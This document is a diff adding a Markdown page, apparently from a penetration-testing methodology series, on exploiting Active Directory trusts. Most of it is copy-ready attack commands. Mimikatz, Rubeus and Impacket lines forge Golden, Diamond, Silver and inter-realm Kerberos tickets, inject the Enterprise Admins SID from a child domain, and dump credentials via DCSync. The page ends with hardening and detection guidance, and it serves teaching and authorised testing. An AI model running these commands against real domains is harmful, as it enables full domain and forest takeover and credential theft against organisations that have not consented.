@@ -1,0 +1,361 @@
+---
+title: "Part 7: Exploiting Domain Trusts"
+description: "Cross-domain and cross-forest attacks — Golden Tickets, Diamond Tickets, Silver Tickets, SID history injection, and trust key abuse."
+category: Methodology
+subcategory: Active Directory Attack
+order: 7
+tags: ["active-directory", "domain-trusts", "golden-ticket", "kerberos", "pentesting"]
+updated: 2026-04-11
+---
+
+# Part 7: Exploiting Domain Trusts
+
+Active Directory forests and domains are linked by trust relationships. A child domain automatically trusts its parent. Forests can trust other forests. Attackers who compromise one domain can leverage these trusts to escalate to Enterprise Admin or pivot into entirely different forests.
+
+---
+
+## Trust Types
+
+| Trust Type | Direction | Transitive? | SID Filtering? | Example |
+|---|---|---|---|---|
+| **Parent-Child** | Two-way | Yes | ❌ No | `child.domain.local` ↔ `domain.local` |
+| **Tree-Root** | Two-way | Yes | ❌ No | `other.local` ↔ `domain.local` (same forest) |
+| **Forest** | One/Two-way | Yes | ✅ Yes (default) | `domain.local` ↔ `external.local` |
+| **External** | One/Two-way | No | ✅ Yes | Legacy NT4-style trust |
+| **Shortcut** | One/Two-way | Yes | ❌ No | Optimization within a forest |
+
+### Key concept: SID Filtering
+
+SID filtering strips "foreign" SIDs from a Kerberos ticket when crossing a trust boundary. Within a forest (parent-child), SID filtering is **disabled** — which means SID history injection works. Across forests, it's enabled by default.
+
+### Enumeration
+
+```powershell
+# PowerView
+Get-DomainTrust
+Get-DomainTrust -Domain parent.domain.local
+Get-ForestTrust
+Get-ForestDomain                            # All domains in the forest
+
+# nltest
+nltest /domain_trusts /all_trusts
+nltest /trusted_domains
+
+# .NET
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+```
+
+```bash
+# Impacket
+lookupsid.py domain.local/user:pass@dc01 0    # Get domain SID
+```
+
+---
+
+## Golden Ticket
+
+**Severity:** 🔴 Critical
+
+With the `krbtgt` account's hash, you can forge a Ticket Granting Ticket (TGT) for **any user** with **any group membership** — including non-existent users and groups. This gives you complete domain control for as long as the krbtgt hash remains unchanged.
+
+### Requirements
+
+- `krbtgt` NTLM hash (from DCSync)
+- Domain SID
+- Domain FQDN
+
+### Forging
+
+```powershell
+# Mimikatz — create and inject Golden Ticket
+mimikatz "kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-XXXXX /krbtgt:NTHASH /ptt"
+
+# With specific groups (Domain Admins=512, Enterprise Admins=519, Schema Admins=518)
+mimikatz "kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-XXXXX /krbtgt:NTHASH /id:500 /groups:512,519,518 /ptt"
+```
+
+```bash
+# Impacket
+ticketer.py -nthash KRBTGT_HASH \
+  -domain-sid S-1-5-21-XXXXX \
+  -domain domain.local \
+  fakeadmin
+
+export KRB5CCNAME=fakeadmin.ccache
+psexec.py -k -no-pass domain.local/fakeadmin@dc01.domain.local
+secretsdump.py -k -no-pass domain.local/fakeadmin@dc01.domain.local
+```
+
+### Lifetime & Persistence
+
+By default, Golden Tickets are valid for 10 years. The only way to invalidate them is to reset the `krbtgt` password **twice** (because AD keeps the current and previous password).
+
+```powershell
+# Reset krbtgt (do this TWICE with at least 12-24 hours between resets)
+# First reset invalidates tickets using the OLD password
+# Second reset invalidates tickets using the CURRENT password
+Reset-ADServiceAccountPassword -Identity krbtgt
+```
+
+---
+
+## Diamond Ticket
+
+**Severity:** 🔴 Critical
+
+An evolution of the Golden Ticket. Instead of forging a TGT from scratch (which has detectable anomalies), a Diamond Ticket **modifies a legitimately-issued TGT**. The metadata (timestamps, encryption, PAC structure) comes from a real ticket, making it much harder to detect.
+
+### Forging
+
+```powershell
+# Rubeus — request a real TGT, then modify it
+Rubeus.exe diamond /krbkey:<krbtgt_aes256_key> \
+  /user:regular_user /password:their_password \
+  /enctype:aes /ticketuser:administrator \
+  /domain:domain.local /dc:dc01.domain.local \
+  /groups:512 /ptt
+
+# The ticket appears legitimate because:
+# - It was originally issued by the real KDC
+# - Timestamps are genuine
+# - Encryption matches real ticket format
+# - Only the PAC (user info) is modified
+```
+
+> 💡 **Why Diamond over Golden?** Golden Tickets have known detection indicators (no corresponding AS-REQ, unusual encryption, etc.). Diamond Tickets start with a real AS-REQ/AS-REP exchange, making them blend in with normal traffic.
+
+---
+
+## Silver Ticket
+
+**Severity:** 🟠 High
+
+Forge a TGS (service ticket) for a specific service using the service account's NTLM hash. Unlike Golden Tickets, Silver Tickets go **directly to the target service** — they never touch the DC, making them stealthier but more limited in scope.
+
+### Requirements
+
+- Service account's NTLM hash (often the machine account hash)
+- Domain SID
+- Target service SPN
+
+### Common Service SPNs
+
+| SPN | What It Gives You |
+|---|---|
+| `cifs/host` | SMB access (file shares, PSExec) |
+| `ldap/host` | LDAP queries (DCSync on DCs) |
+| `http/host` | WinRM / PowerShell remoting |
+| `mssql/host` | SQL Server access |
+| `host/host` | Scheduled tasks, WMI |
+
+### Forging
+
+```powershell
+# Mimikatz
+mimikatz "kerberos::golden /user:administrator /domain:domain.local \
+  /sid:S-1-5-21-XXXXX /target:fileserver.domain.local \
+  /service:cifs /rc4:MACHINE_NTHASH /ptt"
+
+# For DCSync via Silver Ticket (target LDAP on DC)
+mimikatz "kerberos::golden /user:administrator /domain:domain.local \
+  /sid:S-1-5-21-XXXXX /target:dc01.domain.local \
+  /service:ldap /rc4:DC01_MACHINE_HASH /ptt"
+```
+
+```bash
+# Impacket
+ticketer.py -nthash MACHINE_HASH \
+  -domain-sid S-1-5-21-XXXXX \
+  -domain domain.local \
+  -spn cifs/fileserver.domain.local \
+  administrator
+
+export KRB5CCNAME=administrator.ccache
+smbclient.py -k -no-pass domain.local/administrator@fileserver.domain.local
+```
+
+---
+
+## Cross-Domain: SID History Injection
+
+**Severity:** 🔴 Critical
+
+Within the same forest, SID filtering is disabled on parent-child trusts. A Golden Ticket forged in a child domain can include extra SIDs from the parent domain — specifically the Enterprise Admins SID — granting forest-wide admin access.
+
+### From Child to Parent Domain
+
+```powershell
+# Get the parent domain SID
+Get-DomainSID -Domain parent.domain.local
+# Result: S-1-5-21-PARENT
+
+# Enterprise Admins SID = parent domain SID + RID 519
+# S-1-5-21-PARENT-519
+
+# Forge Golden Ticket with extra SID
+mimikatz "kerberos::golden \
+  /user:fakeadmin \
+  /domain:child.domain.local \
+  /sid:S-1-5-21-CHILD \
+  /krbtgt:CHILD_KRBTGT_HASH \
+  /sids:S-1-5-21-PARENT-519 \
+  /ptt"
+```
+
+```bash
+# Impacket
+ticketer.py -nthash CHILD_KRBTGT_HASH \
+  -domain-sid S-1-5-21-CHILD \
+  -domain child.domain.local \
+  -extra-sid S-1-5-21-PARENT-519 \
+  fakeadmin
+
+export KRB5CCNAME=fakeadmin.ccache
+secretsdump.py -k -no-pass child.domain.local/fakeadmin@parent-dc01.parent.domain.local
+```
+
+### This works because:
+
+1. Child domain krbtgt encrypts the TGT
+2. The TGT includes an extra SID for Enterprise Admins
+3. When the TGT crosses the child→parent trust, SID filtering is **not applied**
+4. The parent DC sees Enterprise Admins in the PAC and grants full access
+
+---
+
+## Trust Key (Inter-Realm TGT)
+
+**Severity:** 🟠 High
+
+Instead of using the krbtgt hash, use the **inter-realm trust key** to forge referral tickets. This key is shared between the two domains during trust establishment.
+
+### Extract Trust Key
+
+```bash
+# Via DCSync
+secretsdump.py domain.local/admin:pass@dc01 | grep "trust"
+
+# Output:
+# child.domain.local$:NTHASH  (this is the trust key)
+```
+
+### Forge Inter-Realm TGT
+
+```powershell
+# Mimikatz
+mimikatz "kerberos::golden \
+  /user:administrator \
+  /domain:child.domain.local \
+  /sid:S-1-5-21-CHILD \
+  /rc4:TRUST_KEY_HASH \
+  /service:krbtgt \
+  /target:parent.domain.local \
+  /sids:S-1-5-21-PARENT-519 \
+  /ptt"
+```
+
+```bash
+# Impacket
+ticketer.py -nthash TRUST_KEY_HASH \
+  -domain-sid S-1-5-21-CHILD \
+  -domain child.domain.local \
+  -spn krbtgt/parent.domain.local \
+  -extra-sid S-1-5-21-PARENT-519 \
+  administrator
+```
+
+---
+
+## Cross-Forest Attacks
+
+Cross-forest attacks are harder because **SID filtering is enabled** by default. However, there are still avenues:
+
+### If SID Filtering Is Disabled (Misconfiguration)
+
+```powershell
+# Check if SID filtering is disabled
+Get-ADTrust -Filter * | select Name, SIDFilteringForestAware, SIDFilteringQuarantined
+# SIDFilteringQuarantined = $false means SID filtering is OFF
+
+# If disabled, same SID history injection as parent-child
+```
+
+### Access via Shared Resources
+
+Even with SID filtering, if users in Forest A have been granted explicit permissions in Forest B (common in mergers/acquisitions):
+
+```powershell
+# Enumerate cross-forest permissions
+Get-DomainForeignGroupMember -Domain external.local
+Get-DomainForeignUser -Domain external.local
+
+# Kerberoast across trust
+GetUserSPNs.py -target-domain external.local domain.local/user:pass
+```
+
+### Trust Ticket Forging Across Forests
+
+```bash
+# Get the inter-forest trust key via DCSync
+secretsdump.py domain.local/admin:pass@dc01 | grep "external"
+
+# Request TGS for services in the foreign forest
+getST.py -spn cifs/server.external.local \
+  -impersonate administrator \
+  domain.local/user -hashes :TRUST_KEY
+```
+
+---
+
+## Defense & Detection
+
+### Hardening
+
+| Control | What It Prevents |
+|---|---|
+| **Reset krbtgt twice** after breach | Invalidates Golden/Diamond Tickets |
+| **Enable SID filtering** on all forest trusts | SID history injection across forests |
+| **Selective authentication** on trusts | Limits which users can cross the trust |
+| **Protected Users group** | Prevents delegation and credential caching |
+| **Tiered admin model** | Separate admin accounts per domain/tier |
+| **Minimize cross-forest permissions** | Reduces lateral paths |
+
+### Detection (Event IDs)
+
+| Event ID | What It Catches |
+|---|---|
+| **4768** | TGT request — anomalous encryption types |
+| **4769** | TGS request — unusual service targets across trusts |
+| **4770** | TGT renewal — Golden Ticket indicators |
+| **4771** | Pre-auth failure — forged ticket detection |
+| **4624 (Type 3)** | Cross-domain logon events |
+
+### Golden Ticket Detection Indicators
+
+- TGT with no corresponding 4768 event (ticket was forged, not requested)
+- Tickets with unusually long lifetimes (default Golden Ticket = 10 years)
+- Tickets using RC4 encryption when AES is enforced
+- Tickets for non-existent users
+- TGTs used from machines the user isn't logged into
+
+### Diamond Ticket Detection
+
+Diamond Tickets are harder to detect because they have legitimate AS-REQ/AS-REP pairs. Focus on:
+
+- PAC inconsistencies (group memberships that don't match AD)
+- Behavioral anomalies (user suddenly accessing resources they never accessed before)
+- Comparing PAC contents with actual AD group membership in real-time
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **Next up → [Part 8: Persistence & Post-Exploitation](/docs/methodology/active-directory-attack/08-persistence)** — Skeleton Key, DCShadow, AdminSDHolder backdoor, and certificate persistence.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
